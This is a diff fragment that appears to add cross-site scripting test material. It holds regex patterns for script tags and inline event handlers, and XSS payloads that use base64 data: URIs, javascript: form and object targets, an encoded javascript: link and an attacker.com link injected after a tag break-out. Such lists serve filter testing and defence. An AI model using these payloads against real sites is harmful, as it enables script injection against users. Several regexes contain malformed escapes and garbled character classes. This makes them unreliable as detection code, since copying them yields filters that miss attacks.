@@ -1,3 +1,20 @@
+"(?i)(<script[^>]*>[\s\S]*?<\/script[^>]*>|<script[^>]*>[\s\S]*?<\/script[[\s\S]]*[\s\S]|<script[^>]*>[\s\S]*?<\/script[\s]*[\s]|<script[^>]*>[\s\S]*?<\/script|<script[^>]*>
+[\s\S]*?)"
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">show</a>
+<form action="javascript:alert(1)"><button>send</button></form>
+<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
+<object data="javascript:alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+0x09,0x0B,0x0C,0x20,0x3B
+0x09,0x20,0x28,0x2C,0x3B
+0x2C,0x3B
+0x09,0x20,0x28,0x2C,0x3B
+0x09,0x20,0x2C,0x3B
+0x09,0x20,0x28,0x2C,0x3B
+(?i)([\s\"'`;\/0-9\=\x00\x09\0A\x0B\x0C\0x0D\x3B\x2C
+\x28\x3B]+on\w+[\s\x00\x09\0A\x0B\x0C\0x0D\x3B\x2C\x28\x3
+B]*?=)
 "><a href=https://www.attacker.com/>attacker.com</a>
 <a href=https://google.com/>link</a>
 <A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
